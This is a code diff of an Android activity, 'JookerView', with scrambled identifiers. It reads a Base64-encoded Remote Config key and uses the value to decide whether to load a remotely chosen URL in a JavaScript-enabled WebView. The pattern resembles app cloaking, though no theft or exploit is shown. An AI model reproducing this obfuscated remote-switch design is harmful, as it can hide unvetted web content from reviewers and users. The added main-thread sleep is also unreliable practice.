@@ -27,25 +27,15 @@ import com.unity3d.player.UnityPlayerActivity;
 
 public class JookerView extends AppCompatActivity {
 
-    FirebaseRemoteConfig gfR8xUZ238;
+    public static FirebaseRemoteConfig gfR8xUZ238;
     ProgressBar p339HPaAv;
-    WebView Zv57FmD8f7;
+    public static WebView Zv57FmD8f7;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.joooker_view);
         p339HPaAv = findViewById(R.id.joooker_progress);
         Zv57FmD8f7 = findViewById(R.id.joooker_view);
-
-        gfR8xUZ238 = FirebaseRemoteConfig.getInstance();
-        FirebaseRemoteConfigSettings joooker_FirebaseRometeConfigSettings = new FirebaseRemoteConfigSettings.Builder().build();
-        gfR8xUZ238.setDefaultsAsync(R.xml.joooker_url);
-        gfR8xUZ238.setConfigSettingsAsync(joooker_FirebaseRometeConfigSettings);
-        try {
-            Thread.sleep(1600);
-        } catch (InterruptedException e) {
-            e.printStackTrace();
-        }
 
         if(!gfR8xUZ238.getString(new String(android.util.Base64.decode("am9vb2tlcl91cmw=", Base64.DEFAULT)))
                 .equals(new String(Base64.decode("am9vb2tlcl91cmw=", Base64.DEFAULT))))
@@ -60,19 +50,23 @@ public class JookerView extends AppCompatActivity {
             Zv57FmD8f7.getSettings().setJavaScriptEnabled(true);
             Zv57FmD8f7.getSettings().setUseWideViewPort(true);
             Zv57FmD8f7.setWebChromeClient(new JoookerChrome(this, p339HPaAv));
+            Zv57FmD8f7.setWebViewClient(new JoookerWeb());
             Zv57FmD8f7.setBackgroundColor(Color.WHITE);
             Zv57FmD8f7.getSettings().setLoadsImagesAutomatically(true);
             Zv57FmD8f7.getSettings().setLoadWithOverviewMode(true);
             Zv57FmD8f7.getSettings().setBuiltInZoomControls(false);
-            Zv57FmD8f7.setWebViewClient(new JoookerWeb());
             Zv57FmD8f7.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
             Zv57FmD8f7.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
-
 
             JoookerNetwork joookerNetwork = new JoookerNetwork(Zv57FmD8f7);
             IntentFilter winIntentFilter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
             winIntentFilter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);
             registerReceiver(joookerNetwork, winIntentFilter);
+            try {
+                Thread.sleep(2000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
 
         }
         else {
